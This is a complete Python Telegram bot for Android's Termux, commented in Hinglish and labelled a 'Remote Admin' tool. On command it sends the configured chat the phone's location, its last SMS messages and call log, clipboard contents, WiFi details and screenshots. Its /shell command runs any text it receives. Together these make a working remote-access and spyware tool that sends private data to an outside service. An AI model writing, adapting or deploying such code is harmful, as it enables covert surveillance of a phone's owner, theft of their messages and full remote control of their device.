import telebot
import subprocess
import json
import os

# Load Config
with open('config.json') as f:
    config = json.load(f)

BOT_TOKEN = config['bot_token']
MY_CHAT_ID = int(config['chat_id'])
START_CMD = config['start_cmd']

bot = telebot.TeleBot(BOT_TOKEN)

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Error: {result.stderr.strip()[:500]}"
    except Exception as e:
        return f"Skipped: {e}"

# PRIVACY CHECK: Sirf aapka Chat ID hi command run kar sakta hai
def is_authorized(message):
    return message.chat.id == MY_CHAT_ID

@bot.message_handler(commands=[START_CMD.replace('/', '')])
def start(message):
    if not is_authorized(message):
        return
    bot.reply_to(message, "Remote Admin Online. Sab kuch ready hai!")

# [1] Battery
@bot.message_handler(commands=['battery'])
def battery(message):
    if not is_authorized(message): return
    bot.reply_to(message, run_cmd("termux-battery-status"))

# [2] Location
@bot.message_handler(commands=['location'])
def location(message):
    if not is_authorized(message): return
    bot.reply_to(message, run_cmd("termux-location"))

# [3] SMS Dump
@bot.message_handler(commands=['sms'])
def sms(message):
    if not is_authorized(message): return
    bot.reply_to(message, "Last 10 SMS:\n" + run_cmd("termux-sms-list -l 10"))

# [4] Call Log Dump
@bot.message_handler(commands=['calllog'])
def calllog(message):
    if not is_authorized(message): return
    bot.reply_to(message, "Last 10 Calls:\n" + run_cmd("termux-call-log -l 10"))

# [5] Clipboard
@bot.message_handler(commands=['clipboard'])
def clipboard(message):
    if not is_authorized(message): return
    bot.reply_to(message, run_cmd("termux-clipboard-get"))

# [6] WiFi
@bot.message_handler(commands=['wifi'])
def wifi(message):
    if not is_authorized(message): return
    bot.reply_to(message, run_cmd("termux-wifi-connectioninfo"))

# [7] Screenshot Lene ke liye
@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    if not is_authorized(message): return
    run_cmd("screencap -p /sdcard/termux_screenshot.png")
    try:
        photo = open('/sdcard/termux_screenshot.png', 'rb')
        bot.send_photo(message.chat.id, photo)
        photo.close()
    except Exception as e:
        bot.reply_to(message, f"Screenshot fail hua (Root/Shizuku lagti hai): {e}")

# [8] Full Remote Shell (Koi bhi command chalane ke liye!)
@bot.message_handler(commands=['shell'])
def shell(message):
    if not is_authorized(message): return
    cmd = message.text.replace('/shell ', '')
    bot.reply_to(message, run_cmd(cmd))

print("[+] Bot Listening... (Sirf aapke Chat ID se commands chalenge)")
bot.infinity_polling()
